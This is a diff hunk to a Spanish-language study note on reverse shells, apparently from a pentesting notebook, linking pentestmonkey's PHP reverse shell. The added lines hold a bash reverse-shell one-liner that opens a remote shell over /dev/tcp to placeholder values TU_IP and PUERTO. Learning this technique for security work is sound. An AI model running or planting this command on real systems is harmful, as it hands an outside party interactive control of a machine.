@@ -39,6 +39,12 @@ La reverse shell existe principalmente para **evadir las restricciones de red pe
 
 `pentestmonkey: `[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
+BASH ACCESO A COMANDOS EJECUTAR ESTO
+
+```bash
+bash -i >& /dev/tcp/TU_IP/PUERTO 0>&1
+```
+
 ---
 
 ## Conexiones y Siguientes Pasos
